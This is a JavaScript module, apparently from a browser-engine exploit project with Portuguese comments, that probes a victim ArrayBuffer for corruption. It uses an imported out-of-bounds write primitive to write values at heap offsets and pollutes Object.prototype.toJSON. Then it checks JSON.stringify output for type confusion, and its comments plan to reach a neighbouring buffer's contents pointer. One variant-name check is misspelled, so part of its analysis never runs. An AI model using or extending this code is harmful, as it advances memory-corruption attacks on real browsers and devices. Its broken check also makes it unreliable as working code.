// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false, // Renomeado para clareza
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };

    // Verificação primária para ArrayBuffer
    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        // Não logar aqui para evitar verbosidade, o chamador logará o resultado
        return result;
    }
    result.is_identified_as_array_buffer = true; // Identificado como AB

    try {
        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, result.dv_write_val, true);
            result.dv_read_val = dv.getUint32(0, true);
            if (result.dv_read_val === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            // Considerar byteLength inválido como um erro se for esperado um AB funcional
            result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_rw_match: false,
        error: null,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        for_in_iterations: 0,
        loop_error: null,
    };

    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        return result;
    }
    result.is_identified_as_array_buffer = true;

    try {
        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, 0xFEEDFACE, true);
            if (dv.getUint32(0, true) === 0xFEEDFACE) result.dv_rw_match = true;
        } else {
             result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
        }

        try {
            for (const prop in this) {
                if (result.for_in_iterations === 0) {
                    result.this_type_in_loop = Object.prototype.toString.call(this);
                }
                result.for_in_iterations++;
                if (result.for_in_iterations > 100) { // Limite anti-loop
                     break;
                }
            }
        } catch (loop_e) {
            result.loop_error = `${loop_e.name}: ${loop_e.message}`;
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

export async function executeVictimABInstabilityTest(victim_ab, corruption_offset_in_oob_ab, value_to_write, victim_ab_size_val, toJSONFunctionName, toJSONFunctionToUse) {
    const FNAME_TEST = "executeVictimABInstabilityTest";
    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer ---`, "subtest", FNAME_TEST);
    logS3(`  Alvo: victim_ab (tamanho esperado: ${victim_ab_size_val})`, "info", FNAME_TEST);
    logS3(`  Corrupção: Escrever ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]`, "info", FNAME_TEST);
    logS3(`  Sonda JSON: ${toJSONFunctionName}`, "info", FNAME_TEST);

    let result = {
        stringifyError: null,
        toJSONReturn: null,
        corruption_offset: corruption_offset_in_oob_ab,
        value_written: value_to_write,
        probe_function: toJSONFunctionName,
        final_verdict_is_problem: false
    };

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        if (!triggerOOB_primitive()) {
            logS3("Falha ao inicializar ambiente OOB. Abortando sub-teste.", "critical", FNAME_TEST);
            result.stringifyError = { name: "OOBSetupError", message: "triggerOOB_primitive failed" };
            return result;
        }
        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) {
            logS3("Falha ao escrever valor de corrupção. Abortando sub-teste.", "error", FNAME_TEST);
            result.stringifyError = { name: "OOBWriteError", message: "oob_write_absolute failed" };
            return result;
        }
        logS3("   Valor de corrupção escrito com sucesso.", "good", FNAME_TEST);
        await PAUSE_S3(SHORT_PAUSE_S3);

        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true,
            enumerable: false,
            configurable: true
        });
        pollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSONFunctionName}.`, "info", FNAME_TEST);

        logS3("   Chamando JSON.stringify(victim_ab)...", "info", FNAME_TEST);
        try {
            const stringify_output = JSON.stringify(victim_ab);
            // O stringify_output é o retorno da NOSSA toJSON.
            // Não precisamos fazer JSON.parse se a toJSON retorna um objeto JS.
            result.toJSONReturn = stringify_output;
            logS3(`   JSON.stringify invocou toJSON. Retorno da toJSON (tipo: ${typeof result.toJSONReturn}): ${typeof result.toJSONReturn === 'object' ? JSON.stringify(result.toJSONReturn) : result.toJSONReturn}`, "info", FNAME_TEST);

        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
            logS3(`   !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do sub-teste: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        if (!result.stringifyError) result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Análise do resultado com base no retorno da sonda toJSON
    if (result.toJSONReturn && typeof result.toJSONReturn === 'object' && result.toJSONReturn !== null) {
        const tr = result.toJSONReturn; // alias

        if (!tr.is_identified_as_array_buffer) { // Se não foi identificado como AB (problema primário)
            result.final_verdict_is_problem = true;
            logS3(`      toJSONReturn indica que 'this' não foi identificado como ArrayBuffer (tipo: ${tr.this_type_entry}).`, "error", FNAME_TEST);
        } else if (tr.error) { // Erro interno na sonda após identificação como AB
            result.final_verdict_is_problem = true;
            logS3(`      toJSONReturn reportou erro interno: ${tr.error}.`, "error", FNAME_TEST);
        } else if (tr.loop_error && tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") { // Erro no loop da V2
             result.final_verdict_is_problem = true;
             logS3(`      toJSONReturn (V2) reportou erro no loop: ${tr.loop_error}.`, "error", FNAME_TEST);
        } else { // Se foi identificado como AB e sem erros, checar anomalias
            if (tr.toJSON_variant === "toJSON_AB_Probe_V1") {
                if (tr.byteLength_prop !== victim_ab_size_val || !tr.dv_rw_match) {
                    result.final_verdict_is_problem = true;
                }
            } else if (tr.toJSON_variant === "toJSON_AB_P_V2_Detailed") { // Corrigido o nome aqui se necessário
                 if (tr.byteLength_prop !== victim_ab_size_val || !tr.dv_rw_match || // Checagens básicas
                    (tr.this_type_in_loop !== "[object ArrayBuffer]" && tr.this_type_in_loop !== "N/A" && tr.for_in_iterations > 0) ||
                    (tr.this_type_after_loop !== "[object ArrayBuffer]")) {
                    result.final_verdict_is_problem = true;
                }
            }
        }
         // Log detalhado do toJSONReturn se houver um problema
        if (result.final_verdict_is_problem && !tr.is_identified_as_array_buffer) {
            // Já logado acima se não for AB
        } else if (result.final_verdict_is_problem) {
            logS3(`      Detalhes do toJSONReturn que indicam problema: byteLength: ${tr.byteLength_prop} (esperado ${victim_ab_size_val}), dv_match: ${tr.dv_rw_match}, type_in_loop(V2): ${tr.this_type_in_loop}, type_after_loop(V2): ${tr.this_type_after_loop}`, "error", FNAME_TEST);
        }


    } else if (result.toJSONReturn === null || typeof result.toJSONReturn !== 'object') {
        logS3(`      toJSONReturn não é um objeto válido ou é nulo. Valor: ${result.toJSONReturn}`, "warn", FNAME_TEST);
        // Considerar isso um problema dependendo da expectativa.
        // Por ora, não marca como final_verdict_is_problem automaticamente, a menos que haja stringifyError.
    }


    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
        result.final_verdict_is_problem = true; // RangeError é um problema
    } else if (result.stringifyError) {
        logS3(`   ---> Erro durante JSON.stringify: ${result.stringifyError.name} - ${result.stringifyError.message}`, "error", FNAME_TEST);
        result.final_verdict_is_problem = true; // Outros erros de stringify também são problemas
    }


    if (result.final_verdict_is_problem) {
        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName} para victim_ab.`, "critical", FNAME_TEST);
        document.title = `PROBLEMA ${toJSONFunctionName} victim_ab (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
    } else {
        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer CONCLUÍDO ---`, "subtest", FNAME_TEST);
    return result;
}

export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima ====`, "test", FNAME_RUNNER);

    const victim_ab_size = 64;
    let victim_ab = null;
    let overall_problem_found = false;

    const corruption_params_to_try = [
        { name: "Offset -16 (0x70), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0xFFFFFFFF },
        { name: "Offset -16 (0x70), Val 0x00000000", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000000 },
        { name: "Offset -16 (0x70), Val 0x12345678", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x12345678 },
        { name: "Offset +0 (0x80 Base DV), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128), value: 0xFFFFFFFF },
        // Adicionar mais offsets interessantes
        // Ex: offset que poderia atingir o m_impl (ponteiro para ArrayBufferContents) de um ArrayBuffer adjacente.
        // Se victim_ab está em X, seu m_impl está em X + JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET (e.g., X + 0x10)
        // A escrita OOB é em oob_array_buffer_real. Se victim_ab está logo após oob_dataview_real,
        // e o oob_dataview_real termina em (BASE_OFFSET_IN_DV + ALLOCATION_SIZE), então o victim_ab poderia começar aí.
        // Uma escrita em (BASE_OFFSET_IN_DV + ALLOCATION_SIZE + 0x10) poderia atingir o m_impl do victim_ab.
        // Isso é altamente dependente do layout da heap. Por ora, os offsets são relativos a BASE_OFFSET_IN_DV.
    ];

    const toJSON_Probes = [
        { name: "toJSON_AB_Probe_V1", func: toJSON_AB_Probe_V1 },
        { name: "toJSON_AB_Probe_V2_Detailed", func: toJSON_AB_Probe_V2_Detailed },
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
        victim_ab = new ArrayBuffer(victim_ab_size);
        logS3(`   Novo victim_ab (${victim_ab_size} bytes) criado.`, "info", FNAME_RUNNER);

        for (const probe of toJSON_Probes) {
            const test_result = await executeVictimABInstabilityTest(
                victim_ab,
                params.offset,
                params.value,
                victim_ab_size,
                probe.name,
                probe.func
            );
            if (test_result.final_verdict_is_problem) {
                overall_problem_found = true;
                // Poderia adicionar um 'break' aqui se quiser parar no primeiro problema encontrado para um conjunto de params
            }
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment(); // Limpa e recria o oob_array_buffer_real para o próximo conjunto de parâmetros
        await PAUSE_S3(SHORT_PAUSE_S3);
    }

    if (overall_problem_found) {
         logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
         document.title = "PROBLEMA(S) DETECTADO(S) - Teste AB Instability";
    } else {
        logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO NAS SONDAGENS. ====`, "good", FNAME_RUNNER);
    }
}
